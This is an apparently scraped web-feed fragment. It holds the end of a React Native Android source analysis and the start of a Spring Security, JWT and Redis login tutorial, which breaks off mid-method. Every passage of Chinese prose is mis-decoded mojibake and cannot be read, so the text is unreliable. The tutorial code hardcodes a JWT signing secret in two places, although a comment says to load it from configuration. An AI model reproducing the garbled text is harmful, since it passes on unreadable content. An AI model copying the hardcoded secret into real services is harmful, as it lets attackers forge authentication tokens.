<p>ç°åœ¨æ¥æŸ¥çœ‹ä¸€ä¸‹æˆ‘ä»¬ç¤ºä¾‹å·¥ç¨‹ç”Ÿæˆçš„<code>example/android/app/build/generated/autolinking/src/main/java/com/facebook/react/PackageList.java</code>æ–‡ä»¶ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PackageList</span> {
  <span class="hljs-keyword">private</span> Application application;
  <span class="hljs-keyword">private</span> ReactNativeHost reactNativeHost;
  <span class="hljs-keyword">private</span> MainPackageConfig mConfig;

  <span class="hljs-comment">// çœç•¥éƒ¨åˆ†ä»£ç ......</span>

  <span class="hljs-keyword">public</span> ArrayList&lt;ReactPackage&gt; <span class="hljs-title function_">getPackages</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(Arrays.&lt;ReactPackage&gt;asList(
      <span class="hljs-keyword">new</span> <span class="hljs-title class_">MainReactPackage</span>(mConfig),
      <span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomWebViewPackage</span>()
    ));
  }
}
</code></pre>
<p>å›é¡¾ä¸€ä¸‹æœ¬æ–‡å¼€å¤´çš„åˆå§‹åŒ–éƒ¨åˆ†ï¼Œæˆ‘ä»¬æåˆ°è¿‡ä»¥ä¸‹ä»£ç </p>
<pre><code class="hljs language-kotlin" lang="kotlin">fabricUIManager =
    FabricUIManager(context, ViewManagerRegistry(viewManagerResolver), eventBeatManager)
</code></pre>
<p>ç°åœ¨å›é¡¾ä¸€ä¸‹<a href="https://juejin.cn/post/7594627998839406634" target="_blank" title="https://juejin.cn/post/7594627998839406634">ã€ŠReact Nativeæ–°æ¶æ„ä¹‹Androidç«¯åˆå§‹åŒ–æºç åˆ†æã€‹</a>ä¸€æ–‡ï¼Œåœ¨<code>ReactInstance</code>ç±»æ„é€ æ—¶ï¼Œæœ‰å¦‚ä¸‹åˆå§‹åŒ–é€»è¾‘ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin">    viewManagerResolver = BridgelessViewManagerResolver(reactPackages, context)

    ComponentNameResolverBinding.install(
        unbufferedRuntimeExecutor,
        <span class="hljs-keyword">object</span> : ComponentNameResolver {
          <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> componentNames: Array&lt;String&gt;
            <span class="hljs-keyword">get</span>() {
              <span class="hljs-keyword">val</span> viewManagerNames = viewManagerResolver.getViewManagerNames()
              <span class="hljs-keyword">if</span> (viewManagerNames.isEmpty()) {
                FLog.e(TAG, <span class="hljs-string">"No ViewManager names found"</span>)
                <span class="hljs-keyword">return</span> arrayOf()
              }
              <span class="hljs-keyword">return</span> viewManagerNames.toTypedArray&lt;String&gt;()
            }
        },
    )
</code></pre>
<p>ç»“åˆä¸Šä¸€èŠ‚<strong>æŸ¥æ‰¾ç»„ä»¶</strong> kotlinå±‚å®ç°çš„åˆ†æï¼Œæ•´ä¸ªæµç¨‹éƒ½ååˆ†æ¸…æ™°äº†ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[# Spring Securityæ•´åˆJWTä¸Rediså®ç°æƒé™è®¤è¯]]></title>    <link>https://juejin.cn/post/7597058147749199882</link>    <guid>https://juejin.cn/post/7597058147749199882</guid>    <pubDate>2026-01-20T09:20:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597058147749199882" data-draft-id="7597080391880474634" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="# Spring Securityæ•´åˆJWTä¸Rediså®ç°æƒé™è®¤è¯"/> <meta itemprop="keywords" content="Java"/> <meta itemprop="datePublished" content="2026-01-20T09:20:57.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æŠ€æœ¯ç‹‚å°å­"/> <meta itemprop="url" content="https://juejin.cn/user/4408380772066938"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            # Spring Securityæ•´åˆJWTä¸Rediså®ç°æƒé™è®¤è¯
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4408380772066938/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æŠ€æœ¯ç‹‚å°å­
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T09:20:57.000Z" title="Tue Jan 20 2026 09:20:57 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Spring Securityæ•´åˆJWTä¸Rediså®ç°æƒé™è®¤è¯</h2>
<blockquote>
<p><strong>ä½œè€…ï¼šæŠ€æœ¯ç‹‚å°å­</strong><br/>
<strong>å‘å¸ƒäºï¼šCSDN Â· Javaè¿›é˜¶å®æˆ˜ä¸“æ </strong><br/>
<strong>æ—¶é—´ï¼š2026å¹´1æœˆ20æ—¥</strong></p>
</blockquote>
<hr/>
<p>æœ€è¿‘åœ¨é‡æ„å…¬å¸ä¸€ä¸ªè€é¡¹ç›®ï¼ŒåŸæ¥çš„æƒé™ç³»ç»Ÿæ˜¯åŸºäº Session çš„ï¼Œéƒ¨ç½²åˆ°é›†ç¾¤ç¯å¢ƒåå„ç§é—®é¢˜é¢‘å‡ºâ€”â€”Session æ— æ³•å…±äº«ã€ç™»å½•çŠ¶æ€ä¸ä¸€è‡´ã€ç™»å‡ºå Token æ— æ³•ç«‹å³å¤±æ•ˆâ€¦â€¦äºæ˜¯å†³å®šå½»åº•æ¢æˆ JWT + Redis çš„æ–¹æ¡ˆã€‚æŠ˜è…¾äº†å‡ å¤©ï¼Œè¸©äº†ä¸å°‘å‘ï¼Œä¹Ÿç†æ¸…äº†ä¸€äº›å…³é”®ç‚¹ï¼Œä»Šå¤©å°±æ¥æ‰‹æŠŠæ‰‹å¸¦å¤§å®¶æŠŠè¿™å¥—æƒé™ä½“ç³»æ­èµ·æ¥ã€‚</p>
<hr/>
<h3 data-id="heading-1">ä¸ºä»€ä¹ˆé€‰ JWT + Redisï¼Ÿ</h3>
<p>å…ˆè¯´ç»“è®ºï¼š<strong>çº¯ JWT ä¸é€‚åˆéœ€è¦å¼ºæ§åˆ¶ç™»å½•çŠ¶æ€çš„ä¸šåŠ¡åœºæ™¯</strong>ã€‚</p>
<p>JWT æœ¬èº«æ˜¯æ— çŠ¶æ€çš„ï¼Œç­¾å‘ä¹‹åæœåŠ¡ç«¯å°±â€œæ”¾æ‰‹ä¸ç®¡â€äº†ã€‚ä½†ç°å®éœ€æ±‚å¾€å¾€æ˜¯ï¼š</p>
<ul>
<li>ç”¨æˆ·ä¿®æ”¹å¯†ç åï¼Œæ—§ Token åº”è¯¥ç«‹å³å¤±æ•ˆï¼›</li>
<li>ç®¡ç†å‘˜å¼ºåˆ¶ä¸‹çº¿æŸä¸ªç”¨æˆ·ï¼›</li>
<li>æ”¯æŒâ€œå•è®¾å¤‡ç™»å½•â€æˆ–â€œè¸¢äººâ€åŠŸèƒ½ã€‚</li>
</ul>
<p>è¿™äº›é çº¯ JWT æ ¹æœ¬åšä¸åˆ°ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬å¼•å…¥ Redisï¼Œç”¨å®ƒæ¥å­˜ä¸€ä»½â€œæœ‰æ•ˆ Token é»‘åå•/ç™½åå•â€ï¼Œæ—¢ä¿ç•™ JWT çš„è½»é‡å’Œè·¨åŸŸä¼˜åŠ¿ï¼Œåˆèƒ½å®ç°æœåŠ¡ç«¯å¯¹ Token çš„ä¸»åŠ¨ç®¡æ§ã€‚</p>
<hr/>
<h3 data-id="heading-2">æ•´ä½“æ¶æ„è®¾è®¡</h3>
<p>text</p>
<p>ç¼–è¾‘</p>
<pre><code class="hljs language-css" lang="css">å®¢æˆ·ç«¯ â†’ ç™»å½• â†’ è¿”å› JWT Tokenï¼ˆå« userIdã€role ç­‰ï¼‰
       â†“
åç»­è¯·æ±‚æºå¸¦ Tokenï¼ˆ<span class="hljs-selector-tag">Header</span>: Authorization: Bearer &lt;token&gt;ï¼‰
       â†“
Spring Security æ‹¦æˆª â†’ éªŒè¯ç­¾å + æŸ¥è¯¢ Redis æ˜¯å¦æœ‰æ•ˆ
       â†“
æœ‰æ•ˆ â†’ æ”¾è¡Œï¼›æ— æ•ˆ/è¿‡æœŸ/è¢«æ‹‰é»‘ â†’ è¿”å› <span class="hljs-number">401</span>
</code></pre>
<p>å…³é”®ç‚¹ï¼š</p>
<ul>
<li>Token ä¾ç„¶ç”± JWT ç”Ÿæˆï¼ŒåŒ…å«å¿…è¦å£°æ˜ï¼ˆå¦‚ç”¨æˆ·IDã€è§’è‰²ï¼‰ï¼›</li>
<li>ç™»å½•æˆåŠŸåï¼Œå°† Token çš„å”¯ä¸€æ ‡è¯†ï¼ˆæ¯”å¦‚ jti æˆ– userId+æ—¶é—´æˆ³ï¼‰å­˜å…¥ Redisï¼Œè®¾ç½®è¿‡æœŸæ—¶é—´ = Token è¿‡æœŸæ—¶é—´ï¼›</li>
<li>æ¯æ¬¡è¯·æ±‚æ ¡éªŒæ—¶ï¼Œé™¤äº†éªŒè¯ JWT ç­¾åå’Œæœ‰æ•ˆæœŸï¼Œè¿˜è¦æŸ¥ Redis æ˜¯å¦å­˜åœ¨è¯¥ Token è®°å½•ï¼›</li>
<li>ç”¨æˆ·ç™»å‡º / ä¿®æ”¹å¯†ç æ—¶ï¼Œä¸»åŠ¨åˆ é™¤ Redis ä¸­å¯¹åº”è®°å½•ï¼Œå®ç°â€œå³æ—¶å¤±æ•ˆâ€ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-3">ä»£ç å®ç°ï¼ˆæ ¸å¿ƒéƒ¨åˆ†ï¼‰</h3>
<h4 data-id="heading-4">1. ä¾èµ–å¼•å…¥ï¼ˆMavenï¼‰</h4>
<p>xml</p>
<p>ç¼–è¾‘</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-security<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.jsonwebtoken<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jjwt-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.11.5<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.jsonwebtoken<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jjwt-impl<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.11.5<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.jsonwebtoken<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jjwt-jackson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.11.5<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<h4 data-id="heading-5">2. JWT å·¥å…·ç±»ï¼ˆç®€åŒ–ç‰ˆï¼‰</h4>
<p>java</p>
<p>ç¼–è¾‘</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JwtUtil</span> {

    <span class="hljs-keyword">private</span> final <span class="hljs-title class_">String</span> secret = <span class="hljs-string">"MySuperSecretKeyForJWT2026"</span>; <span class="hljs-comment">// å®é™…é¡¹ç›®è¯·ä»é…ç½®æ–‡ä»¶è¯»å–</span>
    <span class="hljs-keyword">private</span> final long expiration = <span class="hljs-number">2</span> * <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>; <span class="hljs-comment">// 2å°æ—¶</span>

    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">generateToken</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> userId, List&lt;<span class="hljs-built_in">String</span>&gt; roles</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Jwts</span>.<span class="hljs-title function_">builder</span>()
                .<span class="hljs-title function_">setId</span>(<span class="hljs-variable constant_">UUID</span>.<span class="hljs-title function_">randomUUID</span>().<span class="hljs-title function_">toString</span>()) <span class="hljs-comment">// ä½œä¸º jtiï¼Œç”¨äº Redis key</span>
                .<span class="hljs-title function_">setSubject</span>(userId)
                .<span class="hljs-title function_">claim</span>(<span class="hljs-string">"roles"</span>, roles)
                .<span class="hljs-title function_">setIssuedAt</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>())
                .<span class="hljs-title function_">setExpiration</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(<span class="hljs-title class_">System</span>.<span class="hljs-title function_">currentTimeMillis</span>() + expiration))
                .<span class="hljs-title function_">signWith</span>(<span class="hljs-title class_">SignatureAlgorithm</span>.<span class="hljs-property">HS512</span>, secret)
                .<span class="hljs-title function_">compact</span>();
    }

    <span class="hljs-keyword">public</span> <span class="hljs-built_in">boolean</span> <span class="hljs-title function_">validateToken</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> token</span>) {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-title class_">Jwts</span>.<span class="hljs-title function_">parser</span>().<span class="hljs-title function_">setSigningKey</span>(secret).<span class="hljs-title function_">parseClaimsJws</span>(token);
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        } <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Exception</span> e) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getUserIdFromToken</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> token</span>) {
        <span class="hljs-title class_">Claims</span> claims = <span class="hljs-title class_">Jwts</span>.<span class="hljs-title function_">parser</span>().<span class="hljs-title function_">setSigningKey</span>(secret).<span class="hljs-title function_">parseClaimsJws</span>(token).<span class="hljs-title function_">getBody</span>();
        <span class="hljs-keyword">return</span> claims.<span class="hljs-title function_">getSubject</span>();
    }

    <span class="hljs-keyword">public</span> <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">String</span>&gt; <span class="hljs-title function_">getRolesFromToken</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> token</span>) {
        <span class="hljs-title class_">Claims</span> claims = <span class="hljs-title class_">Jwts</span>.<span class="hljs-title function_">parser</span>().<span class="hljs-title function_">setSigningKey</span>(secret).<span class="hljs-title function_">parseClaimsJws</span>(token).<span class="hljs-title function_">getBody</span>();
        <span class="hljs-keyword">return</span> (<span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">String</span>&gt;) claims.<span class="hljs-title function_">get</span>(<span class="hljs-string">"roles"</span>);
    }
}
</code></pre>
<h4 data-id="heading-6">3. Redis å­˜å‚¨ Token çŠ¶æ€</h4>
<p>java</p>
<p>ç¼–è¾‘</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TokenBlacklistService</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">RedisTemplate</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">Object</span>&gt; redisTemplate;

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> final <span class="hljs-title class_">String</span> <span class="hljs-variable constant_">TOKEN_PREFIX</span> = <span class="hljs-string">"valid_token:"</span>;

    <span class="hljs-comment">// ç™»å½•æˆåŠŸåè°ƒç”¨</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">saveToken</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> userId, <span class="hljs-built_in">String</span> tokenId, long expireMs</span>) {
        <span class="hljs-title class_">String</span> key = <span class="hljs-variable constant_">TOKEN_PREFIX</span> + userId + <span class="hljs-string">":"</span> + tokenId;
        redisTemplate.<span class="hljs-title function_">opsForValue</span>().<span class="hljs-title function_">set</span>(key, <span class="hljs-string">"valid"</span>, <span class="hljs-title class_">Duration</span>.<span class="hljs-title function_">ofMillis</span>(expireMs));
    }

    <span class="hljs-comment">// æ ¡éªŒ Token æ˜¯å¦åœ¨ Redis ä¸­æœ‰æ•ˆ</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">boolean</span> <span class="hljs-title function_">isTokenValid</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> userId, <span class="hljs-built_in">String</span> tokenId</span>) {
        <span class="hljs-title class_">String</span> key = <span class="hljs-variable constant_">TOKEN_PREFIX</span> + userId + <span class="hljs-string">":"</span> + tokenId;
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Boolean</span>.<span class="hljs-property">TRUE</span>.<span class="hljs-title function_">equals</span>(redisTemplate.<span class="hljs-title function_">hasKey</span>(key));
    }

    <span class="hljs-comment">// ç™»å‡º / ä¿®æ”¹å¯†ç æ—¶è°ƒç”¨</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">invalidateUserTokens</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> userId</span>) {
        <span class="hljs-comment">// å®é™…å¯éå†æ‰€æœ‰ä»¥ userId å¼€å¤´çš„ key æ‰¹é‡åˆ é™¤</span>
        <span class="hljs-comment">// ç®€åŒ–å¤„ç†ï¼šç›´æ¥æŒ‰è§„åˆ™åˆ ï¼ˆå‡è®¾ä¸€ä¸ªç”¨æˆ·åªå…è®¸ä¸€ä¸ªæ´»è·ƒ Tokenï¼‰</span>
        <span class="hljs-title class_">Set</span>&lt;<span class="hljs-title class_">String</span>&gt; keys = redisTemplate.<span class="hljs-title function_">keys</span>(<span class="hljs-variable constant_">TOKEN_PREFIX</span> + userId + <span class="hljs-string">":*"</span>);
        <span class="hljs-keyword">if</span> (keys != <span class="hljs-literal">null</span> &amp;&amp; !keys.<span class="hljs-title function_">isEmpty</span>()) {
            redisTemplate.<span class="hljs-title function_">delete</span>(keys);
        }
    }
}
</code></pre>
<blockquote>
<p>âš ï¸ æ³¨æ„ï¼šè¿™é‡Œä¸ºäº†ç®€åŒ–ï¼Œå‡è®¾ä¸€ä¸ªç”¨æˆ·åŒä¸€æ—¶é—´åªæœ‰ä¸€ä¸ªæœ‰æ•ˆ Tokenã€‚å¦‚æœæ”¯æŒå¤šç«¯ç™»å½•ï¼Œéœ€åœ¨ Token ä¸­åŠ å…¥è®¾å¤‡æ ‡è¯†ï¼Œå¹¶åœ¨ Redis ä¸­åˆ†åˆ«å­˜å‚¨ã€‚</p>
</blockquote>
<h4 data-id="heading-7">4. è‡ªå®šä¹‰ Filterï¼šè§£æå¹¶æ ¡éªŒ Token</h4>
<p>java</p>
<p>ç¼–è¾‘</p>
<pre><code class="hljs language-scss" lang="scss">public class JwtAuthenticationFilter extends OncePerRequestFilter {

    <span class="hljs-keyword">@Autowired</span>
    private JwtUtil jwtUtil;

    <span class="hljs-keyword">@Autowired</span>
    private TokenBlacklistService tokenBlacklistService;

    <span class="hljs-keyword">@Override</span>
    protected void doFilterInternal(HttpServletRequest request,
                                    HttpServletResponse response,
                                    FilterChain chain) throws ServletException, IOException {

        String authHeader = request<span class="hljs-selector-class">.getHeader</span>("Authorization");

        if (authHeader != null &amp;&amp; authHeader.startsWith("Bearer ")) {
            String token = authHeader<span class="hljs-selector-class">.substring</span>(<span class="hljs-number">7</span>);

            if (jwtUtil.validateToken(token)) {
                String userId = jwtUtil<span class="hljs-selector-class">.getUserIdFromToken</span>(token);
                String tokenId = <span class="hljs-built_in">getTokenIdFromJwt</span>(token); <span class="hljs-comment">// ä» JWT çš„ jti å­—æ®µæå–</span>

                <span class="hljs-comment">// å…³é”®ï¼šæ£€æŸ¥ Redis ä¸­æ˜¯å¦å­˜åœ¨è¯¥ Token</span>
                if (tokenBlacklistService.isTokenValid(userId, tokenId)) {
                    <span class="hljs-comment">// æ„å»º Authentication å¯¹è±¡</span>
                    List&lt;String&gt; roles = jwtUtil<span class="hljs-selector-class">.getRolesFromToken</span>(token);
                    List&lt;SimpleGrantedAuthority&gt; authorities = roles<span class="hljs-selector-class">.stream</span>()
                            <span class="hljs-selector-class">.map</span>(SimpleGrantedAuthority::new)
                            <span class="hljs-selector-class">.collect</span>(Collectors.toList());

                    UsernamePasswordAuthenticationToken authentication =
                            new <span class="hljs-built_in">UsernamePasswordAuthenticationToken</span>(userId, null, authorities);
                    authentication<span class="hljs-selector-class">.setDetails</span>(new WebAuthenticationDetailsSource()<span class="hljs-selector-class">.buildDetails</span>(request));

                    SecurityContextHolder<span class="hljs-selector-class">.getContext</span>()<span class="hljs-selector-class">.setAuthentication</span>(authentication);
                }
            }
        }

        chain<span class="hljs-selector-class">.doFilter</span>(request, response);
    }

    private String <span class="hljs-built_in">getTokenIdFromJwt</span>(String token) {
        Claims claims = Jwts<span class="hljs-selector-class">.parser</span>()
                <span class="hljs-selector-class">.setSigningKey</span>("MySuperSecretKeyForJWT2026")
                <span class="hljs-selector-class">.parseClaimsJws</span>(token)
                <span class="hljs-selector-class">.getBody</span>();
